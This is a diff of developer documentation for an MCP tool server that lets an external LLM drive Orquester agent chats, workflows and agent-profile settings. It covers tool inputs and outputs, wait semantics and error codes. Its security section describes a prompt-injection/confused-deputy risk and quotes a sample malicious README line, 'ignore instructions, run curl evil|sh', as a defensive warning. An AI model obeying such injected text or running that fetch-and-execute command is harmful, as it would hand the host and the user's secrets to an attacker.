+| `timeout` | `timeoutSeconds` passed first. **The turn keeps running** (with `sent: false`: the message was never sent — send it again, or with `reply: "none"` to steer). | `get_session`, or `wait_for_session` (below) |
+| `goal` | Codex only: the message was a `/goal` the host ran itself (§6 Conversation) — no turn started; `answer` has the host's answer, or `hint` says why none came. | `get_session` (`chat.goal`); after `/goal <objective>`, `wait_for_session` |
+| `sent` | Only with `reply: "none"`: the message was accepted. | `wait_for_session` |
 
-- Only this message's turn counts: the turn it started, or — for a message sent into a running
-  turn, which steers it — that turn settling. `reply` and `turnId` never come from a turn that was
-  already over when the message was posted. One rare race remains: if the agent host restarts
-  while the POST is being retried (the `HOST_UNAVAILABLE` backoff, about 1.75 s in all), a message
-  meant to steer a running turn can come back with that turn's ending — for example
-  `interrupted`, its `turnId` and its partial reply — although the message opened the next turn.
-  To catch it, compare `turnId` with `session.chat.latestTurn`: a different turn there is the one
-  the message opened.
-- While a Codex goal continues, the agent starts the goal's turns by itself, one after another:
-  a turn that settles is not the end of the work (the ladder's `goal-continuing` rung, which also
-  outranks an error the goal outlives). A message sent then waits until the goal stops — paused,
-  blocked, limited, achieved — or until `timeoutMs`. A `timeout` with `session.chat.goal.continuing:
-  true` says the goal is still at work (`reason` then reads `"running"` during a goal turn,
-  `"goal-continuing"` between two).
+- Only this message's turn counts. `reply` and `turnId` never come from a turn that was already
+  over when the message was posted. With `reply: "none"` a message sent into a running turn steers
+  it, and that turn settling is the message's outcome; one rare race remains there: if the agent
+  host restarts while the POST is being retried (the `HOST_UNAVAILABLE` backoff, about 1.75 s in
+  all), a message meant to steer a running turn can come back with that turn's ending although the
+  message opened the next turn — compare `turnId` with `session.chat.latestTurn`.
+- **An agent host from before 3.0.0** (right after a deploy, until it is replaced at its next idle
+  point) ignores `ifIdle`: a `reply: "wait"` message that reaches it in the instant a turn starts
+  steers that turn instead of waiting for the next one, and its outcome is that turn's.
+- While a Codex goal continues, the agent starts the goal's turns by itself, one after another: a
+  turn that settles is not the end of the work (the ladder's `goal-continuing` rung, which also
+  outranks an error the goal outlives). A `reply: "wait"` message waits until the goal stops —
+  paused, blocked, limited, achieved — before it is even sent, or until `timeoutSeconds`.
 - If the session is closed while you wait, the call fails with `SESSION_NOT_FOUND`.
 - After a `timeout`, a bare `wait_for_session` only reports attention raised after that call. Pass
   an `after` from before the turn could settle — the running turn's
@@ -1448,32 +1597,33 @@ event:
 
 ### `wait_for_session`
 
-- **What it watches:** one session (`sessionId`), every session of a project (`project`), or every
-  session (neither) — chat and terminal tabs alike.
+- **What it watches:** one session (`sessionId`), several (`sessionIds`), every session of a project
+  (`project`), or every session (none of them) — chat and terminal tabs alike.
 - **What counts:** a session whose `attention` is set and whose `needsAttentionAt` is later than
   `after`. That is the Attention Center's own stamp: a chat tab turns `needs-input` when an
   approval, a question or a plan opens, and `finished` when a turn settles (a new turn clears it;
   the next settle stamps it again). The stamp also moves when the attention stays the same but
   something new happens: another approval or question opens (even if the previous one was answered
   in the same moment), or another turn settles — one that settled since the daemon's previous poll
-  of the agent host (every 1.5 s). A rewind with `revert_session`, or the history a resumed
+  of the agent host (every 1.5 s). A `rewind`, or the history a resumed
   conversation replays, lands on turns that settled earlier and does not move it. While a Codex
   goal continues, its settled turns raise nothing — the tab stays `working`, `reason:
   "goal-continuing"` — and the goal stopping raises `finished` with a fresh stamp. A terminal tab
   rings (`bell`) or exits (`finished`).
 - **When it returns:** at once if a watched session already qualifies; otherwise when the first one
-  does, or at `timeoutMs`. After the first hit it waits 300 ms and looks again, so sessions flagged
+  does, or at `timeoutSeconds`. After the first hit it waits 300 ms and looks again, so sessions flagged
   by the same host poll come back together.
 - **What it returns:** every qualifying session, newest attention first, and `cursor` — the newest
   `needsAttentionAt` among them. On timeout: `{sessions: [], cursor: <your after>, timedOut: true}`.
+  With one `sessionId`, the result adds that session's `state` and its latest `reply` (or `error`;
+  `emptyReply: true` with a hint for a turn that ended without a written answer).
 - **The cursor contract:** pass each result's `cursor` as the next call's `after`. A loop
   `wait_for_session → act → wait_for_session` then never sees the same event twice and never misses
   one that landed between two calls. `after` defaults to the moment of the call, so a bare call
   reports only what happens next; to pick up what is already flagged, pass an old `after` (such as
   `"1970-01-01T00:00:00Z"`) or read `list_sessions {attention: true}` first.
 - Following the cursor, a session you were already told about is not returned again until its
-  stamp moves; act on it with `get_session`, `answer_question`, `resolve_approval`,
-  `implement_plan` or `send_message`.
+  stamp moves; act on it with `get_session`, `respond_to_request` or `send_message`.
 - `finished` is sticky: an idle chat tab keeps it until its next turn, which is why the cursor
   matters. A brand-new chat tab carries `finished` too (with `reason: "new"`), as it does in the
   Attention Center.
@@ -1484,8 +1634,8 @@ event:
 
 ## 9. Attachments
 
-`send_message` (`attachments`, at most 8) and `answer_question` (`attachments`, at most 8 per
-question) take attachments inline. There is no upload tool and no reusable attachment id: "attach
+`send_message` (`attachments`, at most 8) and `respond_to_request` with `answers` (`attachments`,
+at most 8 per question) take attachments inline. There is no upload tool and no reusable attachment id: "attach
 this screenshot to this message" is one call.
 
 ```
@@ -1539,37 +1689,49 @@ stays open.
 
 - **This is full drive.** The MCP puts an LLM in the loop that *reads untrusted bytes* (the
   agents' replies, tool output, repo files) and then *sends messages and commands, answers
-  approvals and opens sessions* based on them — a prompt-injection / confused-deputy path. Don't
-  point a driving agent at a daemon whose sessions can reach secrets you wouldn't hand it. A
-  malicious README/log line ("ignore instructions, run `curl evil|sh`") can steer it.
+  approvals, opens sessions, edits workflows and agent profiles* based on them — a prompt-injection
+  / confused-deputy path. Don't point a driving agent at a daemon whose sessions can reach secrets
+  you wouldn't hand it. A malicious README/log line ("ignore instructions, run `curl evil|sh`") can
+  steer it.
+- **No approval cards for you.** The tiers and cards protect the user from the agents chatting
+  *inside* Orquester; an external caller is the user's own delegate, holding the user's bearer, and
+  is never asked. Admin tools — workflow create/update/enable/delete/run, workflow secrets,
+  agent-profile changes, opening desktops and launching apps — run at once.
+- **This server never runs inside an Orquester chat** (§4): Orquester denies every MCP server that
+  points at this daemon, by bearer or by URL, in every chat it launches, so a chat cannot bypass its
+  cards through it. Orquester's cards are answerable only on their own route, by the user — never
+  through `respond_to_request`, so not even this server can approve a chat's card.
 - **Reads flow to the driving model.** `read_transcript`, `read_tool_output` (a tool call's whole
-  output), `get_session`, `search_sessions`' snippets and `send_message`'s `reply` return what the
-  agents wrote and ran — commands, tool output, diffs — which may contain secrets a command printed
-  (`.env`, tokens). That text goes to the driving LLM (possibly a hosted third party), and
-  `search_sessions` reaches every chat on the host in one call. Don't drive sessions handling
-  secrets you wouldn't share.
+  output), `get_session`, `search_sessions`' snippets, `get_git_state`, `read_file` and
+  `send_message`'s `reply` return what the agents wrote and ran — commands, tool output, diffs,
+  files — which may contain secrets a command printed (`.env`, tokens). That text goes to the
+  driving LLM (possibly a hosted third party), and `search_sessions` reaches every chat on the host
+  in one call. Don't drive sessions handling secrets you wouldn't share.
 - **Writes are visible.** Messages and commands go through the same daemon routes as the GUI, so a
   human watching the chat tab in the Orquester UI sees every message, answer and approval land —
-  intentional, no hidden side-channel.
+  intentional, no hidden side-channel. Pushes (`notify_user`) reach the user's devices and are
+  rate-limited.
 - **`create_session` is constrained:** chat agents from `list_agents` only, `project` and `cwd`
-  sandboxed, model, options and account validated, 24 running sessions per project.
+  sandboxed (and `cwd` inside the project), model, options and account validated, 24 running
+  sessions per project. A session runs with its workspace's git identity (`list_projects`).
 - **The default permission mode is `full-access`**, as in the GUI: the agent runs its tools without
   asking (on Claude, `bypassPermissions`). Pass `runtimeMode: "approval-required"` to have
-  approvals routed to you (`resolve_approval`) — and remember that a driving model approving tool
+  approvals routed to you (`respond_to_request`) — and remember that a driving model approving tool
   calls is itself acting on untrusted text.
-- **Some calls cannot be undone.** `close_session` deletes the chat thread (the provider's
-  transcript stays resumable, OpenCode's aside); `revert_session` drops turns from the conversation
-  and does not restore files.
+- **Some calls cannot be undone.** `control_session` `close` deletes the chat thread (the
+  provider's transcript stays resumable, OpenCode's aside); `rewind` drops turns from the
+  conversation and does not restore files; `delete_workflow` deletes a workflow with its runs.
 - **Agent-profile writes reach every later session.** An MCP server, hook, plugin or instruction
   text added through §13 is loaded by every later session of that CLI on the host, and hooks and
-  stdio MCP servers run commands — treat these tools like editing the owner's shell profile.
+  stdio MCP servers run commands — treat `edit_agent_profile` like editing the owner's shell
+  profile. A server you add that points at this daemon is denied inside Orquester chats (§4).
+- **Secret values you pass stay in your own transcript.** `set_workflow_secret`'s `value` and
+  `edit_agent_profile`'s MCP `env`/`headers` values are write-only on the daemon, but the driving
+  model's own logs keep them: prefer asking the user to enter secrets in the Orquester UI.
 
-`read_file`/`list_files` widen the read surface: file contents inside the sandbox (including
-`.env`s or tokens developers keep in workspaces) flow to the driving model, exactly like transcript
-reads — and an attachment `path` hands such a file to the agent as well. The todo tools are benign,
-human-visible, event-audited. `get_usage` returns percentages/reset times only; its
-`refresh: true` cannot bust a provider's rate limit (the daemon's backoff floor applies) but is
-still not for polling loops.
+The todo and saved-prompt tools are benign, human-visible, event-audited. `get_usage` returns
+percentages, reset times and cost estimates only; its `refresh: true` cannot bust a provider's rate
+limit (the daemon's backoff floor applies) but is still not for polling loops.
 
 ---
 
@@ -1583,15 +1745,16 @@ still not for polling loops.
 | `405` on `/mcp` | Not a `POST`. The endpoint is stateless: there is no `GET` event stream and no session to `DELETE`. |
 | `413` | The request body is over 16 MiB — pass large attachments by `path` (§9). |
 | `PATH_NOT_ALLOWED` (`… outside the sandbox`) | A `project`, `cwd`, attachment `path` or file path escaped the sandbox root (the workspaces directory). |
+| `RATE_LIMITED` | `notify_user` more than once a minute; the message says when to try again. |
 | `PROJECT_NOT_FOUND` | Use a path from `list_projects` or `"workspace/project"`; a workspace, or a directory inside a project, is not a project. |
-| `SESSION_NOT_FOUND` | No open tab has that id (closed, or a typo) — `list_sessions`. A wait on one session fails with it as soon as that session closes. So does `revert_session` when the session closes while it waits for the rewind. |
+| `SESSION_NOT_FOUND` | No open tab has that id (closed, or a typo) — `list_sessions`. A wait on one session fails with it as soon as that session closes. So does a `rewind` when the session closes while it waits. |
 | `NOT_A_CHAT_SESSION` | The tool needs a chat tab; terminal tabs can only be listed and closed. |
-| `PENDING_REQUEST` | The agent is waiting on a question or an approval; the message names each request and the tool that answers it. |
-| `SESSION_BUSY` | A turn is running (`update_session` without `force`, `revert_session`, an account switch — wait for it, or `interrupt_session`; while a Codex goal continues, an account switch needs the goal paused and its turn over: `interrupt_session` does both), a rewind still running after 10 s (`revert_session`: do not call it again — it has landed once `get_session`'s `chat.turnCount` comes down to `keepTurns`), or the project already has 24 running sessions (`close_session` some). |
-| `COMMAND_REJECTED` (`… in an error state …`) | The session's `chat.sessionStatus` is `error`, and the host lets only a message (`send_message`, `implement_plan` — it restarts the session), `stop_session` and `revert_session` through. Send a message, or `stop_session`, then try again. Other `COMMAND_REJECTED` messages are the host's own refusal, passed through — `Rewind failed: …` from `revert_session`, for one. |
+| `PENDING_REQUEST` | The agent is waiting on a question or an approval; the message names each request and `respond_to_request`. Send with `reply: "wait"` to queue the message behind it instead. |
+| `SESSION_BUSY` | A turn is running (`update_session` without `force`, a `rewind`, an account switch — wait for it, or `control_session {action: "interrupt"}`; while a Codex goal continues, an account switch needs the goal paused and its turn over: `interrupt` does both), a rewind still running after 10 s (do not rewind again — it has landed once `get_session`'s `chat.turnCount` comes down to `keepTurns`), or the project already has 24 running sessions (`close` some). |
+| `COMMAND_REJECTED` (`… in an error state …`) | The session's `chat.sessionStatus` is `error`, and the host lets only a message (`send_message` — it restarts the session), `stop_process` and `rewind` through. Send a message, or `stop_process`, then try again. Other `COMMAND_REJECTED` messages are the host's own refusal, passed through — `Rewind failed: …` from a `rewind`, for one. |
 | `INVALID_ARGUMENT` naming an agent, model or option | Take the values from `list_agents`. "Still loading … models" means the catalogue is being probed — retry shortly. `<model> takes no options` (Claude's `haiku`) — send it without `options`. A model marked `optionsOmitted` has options: `list_agents {agent, model}`. |
 | `INVALID_ARGUMENT: Invalid arguments for <tool>: …` | An argument failed the tool's schema: a wrong type, a value out of range, an empty string, a missing required field, or an argument name the tool does not have (`Unrecognized key(s)`). The message names each bad field (at most five) and why; `tools/list` describes every parameter. |
-| JSON-RPC error `-32602` (`Tool … not found`) | No tool has that name: a typo, or a client still holding an old tool list (see the stale-guidance row below). |
+| JSON-RPC error `-32602` (`Tool … not found`) | No tool has that name: a typo, a 2.x name (§6 "Migrating from the 72-tool surface" has the new one), or a client still holding an old tool list (see the stale-guidance row below). |
 | `NOT_FOUND` (`No todo list with id …`) | The list was deleted, or the id is mistyped — `list_todos` shows the ids. |
 | `NOT_FOUND` (`No item … in this session`) | `read_tool_output` was given an id the session's host does not have: take a tool row's `outputItemId` from `read_transcript` for the same `sessionId`. |
 | `read_tool_output` answers `kind: "payload"` for a background shell or a running command | The agent host is still the one from before a deploy, which cannot join streamed output: it is replaced once no turn and no background work is running. Read again then. |
@@ -1612,7 +1775,7 @@ still not for polling loops.
 Orquester runs **automated workflows**: n8n-like graphs of blocks — triggers (manual, schedule,
 git events), agents, JavaScript code, shell scripts, HTTP requests, if/switch/merge/wait/stop,
 sub-workflows — owned by the daemon and shown in the right rail's "Automated workflows" panel and
-the workflow editor tab. These 13 tools let an agent do what the editor does: "create a workflow
+the workflow editor tab. These 12 tools let an agent do what the editor does: "create a workflow
 that does X, Y, Z", "edit workflow X to add this path", "run it and tell me what happened". They
 are clients of the daemon's `/api/workflows*`, `/api/workflow-runs*` and `/api/workflow-secrets*`
 routes, like every other tool; everything a tool changes shows up live in the editor and the rail.
@@ -1624,16 +1787,15 @@ routes, like every other tool; everything a tool changes shows up live in the ed
 | `list_workflow_block_types` | `type?` | `{types: [{type, category, title, description, handles, output, example, configSchema}], expressionGuide, authoringGuide, configSchemasOmitted?}` — **read it first** |
 | `list_workflows` | `project?` | `{workflows: [{workflowId, name, enabled, revision, project, projectPath?, triggers: [text], nodeCount, errorCount, lastRun?, activeRuns, updatedAt}]}` |
 | `get_workflow` | `workflowId`, `node?` | `{workflowId, name, revision, enabled, project, problems, errorCount, warningCount, connections, workflow}` — or, with `node`, that one block and its connections |
-| `create_workflow` | `name`, `description?`, `project`, `settings?`, `nodes`, `edges? = []`, `enabled? = false` | `{created: true, workflowId, revision, problems, …, connections, workflow, next?}` |
-| `update_workflow` | `workflowId`, `revision`, `ops` (1–500) | `{updated: true, workflowId, revision, problems, …, connections, workflow}` |
-| `validate_workflow` | `workflow` | `{valid, problems, errorCount, warningCount}` — a missing id, revision, timestamp, block position, edge id or edge `sourceHandle` is filled in |
+| `create_workflow` | `name`, `description?`, `project`, `settings?`, `nodes`, `edges? = []`, `enabled? = false`, `dryRun? = false` | `{created: true, workflowId, revision, problems, …, connections, workflow, next?}`; with `dryRun`, the validation only |
+| `update_workflow` | `workflowId`, `revision`, `ops` (1–500), `dryRun? = false` | `{updated: true, workflowId, revision, problems, …, connections, workflow}`; with `dryRun`, the patched definition's validation only |
 | `delete_workflow` | `workflowId`, `confirm: true` | `{deleted: true, workflowId}` |
-| `run_workflow` | `workflowId`, `input?`, `wait? = false`, `timeoutSeconds? = 300` (≤ 600), `force? = false` | `{runId, status: "started"}`; with `wait`, `{runId, finished, timedOut?, run, blocks, outputNote?}`; skipped: `{runId: null, skipped: "overlap", message}` |
-| `list_workflow_runs` | `workflowId`, `before?`, `limit? = 20` (≤ 50) | `{runs: [RunSummary], before}` — `before: null` = no more |
-| `get_workflow_run` | `runId`, `includeOutputs? = true`, `nodeId?`, `outputOffset? = 0` | `{run, blocks, outputNote?}`; with `nodeId`, `{run, block, output}` or a window `{outputText, offset, totalBytes, nextOffset?}` |
+| `preview_expression` | `workflowId`, `template?` or `templates?`, `node?`, `runId?`, `usePinned? = false`, `mode? = "text"` | each rendered text (or raw value), warnings, parse errors, `available` |
+| `run_workflow` | `workflowId`, `revision`, `input?`, `wait? = false`, `timeoutSeconds? = 300` (≤ 600), `force? = false` | `{runId, status: "started"}`; with `wait`, `{runId, finished, timedOut?, run, blocks, outputNote?}`; skipped: `{runId: null, skipped: "overlap", message}` |
+| `get_workflow_runs` | `workflowId` (`before?`, `limit? = 20`), or `runId` (`waitSeconds?`), or `runId` + `nodeId` (`outputOffset?`, `log?`) | runs, newest first, `before`; one run's `{run, blocks, outputNote?}`; one block's `output` or a window `{outputText, offset, totalBytes, nextOffset?}`, or its stdout/stderr log |
 | `cancel_workflow_run` | `runId` | `{cancelRequested: true, runId, run?}` |
 | `list_workflow_secrets` | `workflowId?` | `{secrets: [{name, scope, workflowId?, updatedAt, short?}]}` — names only |
-| `set_workflow_secret` | `name`, `value`, `workflowId?` | `{set: true, name, scope, workflowId?, warning?}` |
+| `set_workflow_secret` | `name`, `value?`, `workflowId?`, `delete? = false` | `{set: true, name, scope, workflowId?, warning?}` or the deletion |
 
 - **`project`** is `{kind: "existing", project: "<workspace>/<project>" or an absolute path}`
   (resolved exactly like every other tool's `project`, §5), or `{kind: "temp", workspace, source:
@@ -1651,13 +1813,15 @@ routes, like every other tool; everything a tool changes shows up live in the ed
   `keepFailedTempDays` (0–30).
 - A new workflow is **disabled** unless `enabled: true` — its schedule and git triggers do not
   fire. Manual runs (`run_workflow`) work either way. Enabling is refused while the definition has
-  a problem of severity `error`.
+  a problem of severity `error`. `dryRun: true` on `create_workflow` or `update_workflow` validates
+  without saving.
 - **`problems`** come back on every read and write: `{severity: "error" | "warning" | "info", code,
   message, nodeId?, edgeId?, field?}`, errors first, at most 100 (`problemsOmitted` counts the
   rest). Errors (a cycle, a reference to an unknown block, `{{ }}` in a shell script…) block
   enabling; warnings (a secret in an agent prompt, an unknown secret name…) do not.
-- **`revision`** moves by one on every save. `update_workflow` must send the revision it last read
-  (`get_workflow`, or the previous write's answer).
+- **`revision`** moves by one on every save. `update_workflow` and `run_workflow` must send the
+  revision they last read (`get_workflow`, or the previous write's answer): a run is refused when
+  the definition changed since, so what runs is what was read.
 
 ### Authoring rules (what `list_workflow_block_types`' `authoringGuide` teaches)
 
@@ -1711,8 +1875,8 @@ reads the input as `{{ trigger.input… }}`). With `wait: true` it waits — on 
 (`workflowRun.updated` / `workflowRun.finished` on the `workflows` channel), re-reading the run
 every 10 s only as a safety net, never polling — for at most `timeoutSeconds`, then answers the
 run as it stands: `finished: true`, or `finished: false, timedOut: true` for a run still going
-(the run itself goes on; `get_workflow_run` later, or `cancel_workflow_run`). Agent blocks can
-take hours: for those, start without `wait` and check back. When the overlap policy skips the run
+(the run itself goes on; `get_workflow_runs {runId, waitSeconds}` later, or `cancel_workflow_run`).
+Agent blocks can take hours: for those, start without `wait` and check back. When the overlap policy skips the run
 (`overlap: "skip"` and a run already active) the answer is `{runId: null, skipped: "overlap"}`;
 `force: true` runs anyway.
 
@@ -1723,7 +1887,7 @@ finished on), `attempt`, `error {kind, message}`, `warnings`, and for an agent b
 `selection` (why that account). **Outputs are fitted to one result**: small ones come back whole
 as `output`, and when they do not all fit, the largest become `outputText` — the head of their
 JSON — with `outputTruncated: true` (the daemon's own preview cut sets it too). Read a whole
-output with `get_workflow_run {runId, nodeId}`: it answers `output` when it fits, else a window of
+output with `get_workflow_runs {runId, nodeId}`: it answers `output` when it fits, else a window of
 its JSON text (`outputText`, `offset`, `totalBytes`, `nextOffset`); call again with
 `outputOffset = nextOffset` until there is none.
 
@@ -1746,7 +1910,7 @@ config schemas largest first (`configSchemasOmitted` — `{type}` returns one wh
 outputs as above.
 
 Errors keep the daemon's codes, with a hint: `WORKFLOW_NOT_FOUND` (`list_workflows`),
-`RUN_NOT_FOUND` (`list_workflow_runs`), `NODE_NOT_FOUND` (it lists the blocks),
+`RUN_NOT_FOUND` (`get_workflow_runs {workflowId}`), `NODE_NOT_FOUND` (it lists the blocks),
 `REVISION_CONFLICT` (**re-read with `get_workflow`**, then send the ops again),
 `INVALID_WORKFLOW` (its problems are in the message — up to eight — and all of them in
 `detail.problems`; also an op or entry the daemon refused, named by the index its body carries
@@ -1830,7 +1994,7 @@ update_workflow { "workflowId": "5f0c…", "revision": 0, "ops": [
 5. Test it, then turn it on:
 
 ```
-run_workflow { "workflowId": "5f0c…", "wait": true, "timeoutSeconds": 600 }
+run_workflow { "workflowId": "5f0c…", "revision": 1, "wait": true, "timeoutSeconds": 600 }
 → { "runId": "r-81…", "finished": true,
     "run": { "status": "succeeded", "durationMs": 412345, "finalOutput": { "moved": ["PROJ-7"] } },
     "blocks": [
@@ -1855,7 +2019,7 @@ update_workflow { "workflowId": "5f0c…", "revision": 1, "ops": [{ "op": "set_e
 Orquester's right rail has an **Agent profile** panel that edits each agent CLI's *own* global
 configuration: MCP servers, skills, plugins, plugin marketplaces, hooks, slash commands and the
 global instruction file (Claude's `~/.claude/CLAUDE.md`; Codex's, Grok's and OpenCode's
-`AGENTS.md`). These 13 tools do the same, for `claude`, `codex`, `grok` and `opencode`. They are
+`AGENTS.md`). These 2 tools do the same, for `claude`, `codex`, `grok` and `opencode`. They are
 clients of the daemon's `/api/agent-profile*` routes — the panel's own — so every write goes to the
 CLI's native file through the same adapter, backup and validation, and shows up live in the panel.
 The CLIs' files stay the only source of truth: what a tool writes is what the next session of that
@@ -1865,19 +2029,30 @@ CLI loads.
 
 | Tool | Input | Returns |
 |---|---|---|
-| `list_agent_profiles` | `installedOnly? = false` | `{agents: [{agent, label, installed, version?, counts: {mcp?, skill?, plugin?, marketplace?, hook?, command?}}]}` |
-| `get_agent_profile` | `agent`, `kind?`, `query?` | `{agent, label, installed, version?, counts, instructions, fileErrors?, authoring, matched, truncated, items: [Item], omitted?, note?}` |
-| `get_agent_profile_item` | `agent`, `id` | `{agent, item: Item + path?}` and, by kind, `mcp` (secrets as keys), `document: {frontmatter, body}` + `files?` (skill/command; `bodyTruncated?`), `hook`, `plugin` or `marketplace` |
-| `create_agent_profile_item` | `agent`, exactly one of `mcp`, `skill`, `command`, `hook`, `plugin`, `marketplace`; `onConflict? = "fail"` | `{created: true, agent, kind, itemIds, notes, items: [Item]}` |
-| `update_agent_profile_item` | `agent`, `id`, `revision?`, exactly one of `mcp`, `skill`, `command`, `hook` (the item's kind) | `{updated: true, agent, previousId, itemIds, notes, items}` |
-| `set_agent_profile_item_enabled` | `agent`, `id`, `enabled`, `revision?` | `{enabled, agent, itemIds, notes, items}` |
-| `delete_agent_profile_item` | `agent`, `id`, `revision?`, `confirm: true` | `{deleted: true, agent, id, notes}` |
-| `copy_agent_profile_item` | `agent`, `id`, `toAgent`, `onConflict? = "fail"` | `{copied: true, fromAgent, fromId, agent: <toAgent>, itemIds, notes, items}` |
-| `trust_agent_profile_hook` | `agent`, `id`, `revision?` | `{trusted: true, agent, itemIds, notes, items}` — Codex hooks only |
-| `get_agent_instructions` | `agent`, `offset? = 0` | `{agent, instructions: {path, exists, bytes, lines, mtime?, revision, warnings?}, totalChars, text, truncated?, nextOffset?}` |
-| `write_agent_instructions` | `agent`, `text`, `revision?` | `{written: true, agent, instructions, notes}` |
-| `import_agent_profile_items` | `agent`, then either `url` (scan) or `importId` + `picks` (import); `onConflict? = "fail"` | scan: `{scanned: true, importId, candidates: [{ref, kind, name, description?, exists}], notes, next}`; import: `{imported: true, itemIds, notes, items}` |
-| `list_marketplace_plugins` | `agent`, `marketplace` | `{agent, marketplace, plugins: [{name, description?, version?, installed}]}` |
+| `get_agent_profile` | `{}` | `{agents: [{agent, label, installed, version?, counts: {mcp?, skill?, plugin?, marketplace?, hook?, command?}}]}` |
+| | `{agent, kind?, query?}` | `{agent, label, installed, version?, counts, instructions, fileErrors?, authoring, matched, truncated, items: [Item], omitted?, note?}` |
+| | `{agent, itemId}` | `{agent, item: Item + path?}` and, by kind, `mcp` (secrets as keys), `document: {frontmatter, body}` + `files?` (skill/command; `bodyTruncated?`), `hook`, `plugin` or `marketplace` |
+| | `{agent, instructions: true, offset? = 0}` | `{agent, instructions: {path, exists, bytes, lines, mtime?, revision, warnings?}, totalChars, text, truncated?, nextOffset?}` |
+| | `{agent, marketplace}` | `{agent, marketplace, plugins: [{name, description?, version?, installed}]}` |
+| `edit_agent_profile` | `agent`, `changes: [Change]` (1–10), `reason?` | `{agent, changed, results: [one result per change]}` |
+
+`Change = {action, id?, revision?, …}` by `action` (each result starts `{index, action}`):
+
+| `action` | Fields | Result |
+|---|---|---|
+| `create` | exactly one of `mcp`, `skill`, `command`, `hook`, `plugin`, `marketplace`; `onConflict? = "fail"` | `{kind, itemIds, notes, items: [Item]}` |
+| `update` | `id`, `revision?`, the object named after the item's kind (`mcp`, `skill`, `command` or `hook`) with only what changes | `{previousId, itemIds, notes, items}` |
+| `enable` / `disable` | `id`, `revision?` | `{enabled, itemIds, notes, items}` |
+| `delete` | `id`, `revision?` | `{deleted: true, id, notes}` |
+| `copy` | `id`, `toAgent`, `onConflict? = "fail"` | `{fromId, toAgent, itemIds, notes, items}` |
+| `trust_hook` | `id`, `revision?` (Codex hooks only) | `{trusted: true, itemIds, notes, items}` |
+| `write_instructions` | `text` (the whole file), `revision?` | `{written: true, instructions, notes}` |
+| `import_scan` | `url` | `{importId, candidates: [{ref, kind, name, description?, exists}], notes}` |
+| `import_pick` | `importId`, `picks: [ref…]`, `onConflict? = "fail"` | `{itemIds, notes, items}` |
+
+Changes run in order and **stop at the first failure**: the error names it
+(`changes[<i>] (<action>): …`) and its `detail` carries `failedIndex` and `completed` — the results
+of the changes already made (nothing is rolled back). Put changes that belong together in one call.
 
 An **Item** is `{id, kind, name, description?, enabled, stashed?, source, sourceType, ownerAgent?,
 pluginId?, locked, toggleable, editable, deletable, warnings?, meta?, revision}`:
@@ -1892,11 +2067,11 @@ pluginId?, locked, toggleable, editable, deletable, warnings?, meta?, revision}`
   `deletable` say what the daemon will allow (it answers `NOT_EDITABLE`, `NOT_TOGGLEABLE`,
   `NOT_DELETABLE` or `ITEM_LOCKED` otherwise).
 - **`warnings`** are the panel's amber chips: `{code, message, action?}` — `action: "trust"` on a
-  Codex hook Codex will not run until trusted (`trust_agent_profile_hook`).
-- **`fileErrors`** (on `get_agent_profile`) lists config files the daemon could not parse: the list
+  Codex hook Codex will not run until trusted (the `trust_hook` change).
+- **`fileErrors`** (on `get_agent_profile {agent}`) lists config files the daemon could not parse: the list
   is partial, and every write to such a file answers `CONFIG_UNREADABLE` until it is fixed by hand.
 
-`get_agent_profile`'s **`authoring`** tells you what the agent accepts before you write:
+`get_agent_profile {agent}`'s **`authoring`** tells you what the agent accepts before you write:
 `kinds`, `creatableKinds` (Codex cannot create commands; OpenCode has no hooks or marketplaces),
 `copyableKinds` (`mcp`, `skill`, `command`), `mcpTransports`, `mcpAdvancedFields` (the per-agent
 extras, e.g. Codex `startup_timeout_sec`, `enabled_tools`), `hookEvents` and `frontmatterFields`
@@ -1906,8 +2081,7 @@ its head: `truncated: true`, `omitted`, and a note to narrow it.
 
 ### Creating and editing
 
-`create_agent_profile_item` takes the object named after the kind:
-
+A `create` change takes the object named after the kind:
 - **`mcp`**: `{name, transport?, command?, args?, cwd?, env?, url?, headers?, advanced?}` —
   `transport` defaults to `http` when `url` is given, else `stdio`; stdio takes `command`, `args`,
   `cwd`, `env`; http/sse take `url`, `headers` (the other side's fields are refused). **`env` and
@@ -1915,7 +2089,7 @@ its head: `truncated: true`, `omitted`, and a note to narrow it.
 - **`skill`** / **`command`**: `{name, frontmatter?, body?}` — a skill needs
   `frontmatter.description`; a command's name may have one folder level (`git/pr`).
 - **`hook`**: `{event, matcher?, command, timeoutSec?}` — `event` from `authoring.hookEvents`.
-- **`plugin`**: `{plugin, marketplace}` (from `list_marketplace_plugins`), or OpenCode's `{spec}`
+- **`plugin`**: `{plugin, marketplace}` (from `get_agent_profile {agent, marketplace}`), or OpenCode's `{spec}`
   (an npm spec or a file path).
 - **`marketplace`**: `{name?, source: {type: "github", repo: "owner/repo", ref?} | {type: "git",
   url, ref?} | {type: "path", path}}`.
@@ -1923,7 +2097,7 @@ its head: `truncated: true`, `omitted`, and a note to narrow it.
 `onConflict` decides a name collision: `fail` (the default — `ITEM_EXISTS`), `replace`, or
 `keep-both` (the new one gets a suffixed name).
 
-`update_agent_profile_item` takes the object named after **the item's own kind** (`mcp`, `skill`,
+An `update` change takes the object named after **the item's own kind** (`mcp`, `skill`,
 `command` or `hook`; plugins and marketplaces cannot be edited — remove and reinstall) with **only
 what changes**; everything you leave out keeps its current value:
 
@@ -1938,92 +2112,97 @@ what changes**; everything you leave out keeps its current value:
 - hook `matcher: null` / `timeoutSec: null` remove them.
 
 ```
-update_agent_profile_item { "agent": "codex", "id": "mcp:jira",
-  "mcp": { "env": { "JIRA_API_TOKEN": "<new token>", "JIRA_EMAIL": null } } }
-→ { "updated": true, "agent": "codex", "previousId": "mcp:jira", "itemIds": ["mcp:jira"], "notes": [],
-    "items": [{ "id": "mcp:jira", "kind": "mcp", "name": "jira", "enabled": true, "source": "User", …, "revision": "9c1e…" }] }
+edit_agent_profile { "agent": "codex", "changes": [ { "action": "update", "id": "mcp:jira",
+  "mcp": { "env": { "JIRA_API_TOKEN": "<new token>", "JIRA_EMAIL": null } } } ] }
+→ { "agent": "codex", "changed": 1, "results": [ { "index": 0, "action": "update", "previousId": "mcp:jira", "itemIds": ["mcp:jira"], "notes": [],
+    "items": [{ "id": "mcp:jira", "kind": "mcp", "name": "jira", "enabled": true, "source": "User", …, "revision": "9c1e…" }] } ] }
 ```
 
 Here `JIRA_API_TOKEN` is replaced, `JIRA_EMAIL` removed, and any other key (say `JIRA_URL`) kept.
 
-`set_agent_profile_item_enabled` turns an item off natively where the CLI has a switch, or moves it
-to Orquester's stash (and back) where it has none (`stashed: true` while off).
-`delete_agent_profile_item` needs `confirm: true` (Orquester keeps a backup of every file it
